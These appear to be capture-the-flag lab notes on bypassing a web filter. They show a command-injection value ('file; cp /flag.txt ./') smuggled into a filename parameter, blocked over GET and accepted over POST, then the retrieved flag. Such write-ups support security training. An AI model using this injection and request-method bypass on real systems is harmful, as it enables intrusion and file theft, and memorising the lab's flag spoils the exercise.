# Bypassing Security Filters : Insecure Coding

## Identify

- Burp Suite
- Change Request Method

## LAB

http://83.136.251.235:32906/index.php

GET /index.php?filename=file HTTP/1.1

file; cp /flag.txt ./

GET /index.php?filename=file%3b+cp+/flag.txt+./ HTTP/1.1

Malicious Request Denied!

GET /index.php?filename=file%3b+cp+/flag.txt+./ HTTP/1.1

POST /index.php HTTP/1.1
Host: 83.136.251.235:32906
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

filename=file%3b+cp+/flag.txt+./

http://83.136.251.235:32906/flag.txt
HTB{b3_v3rb_c0n51573n7}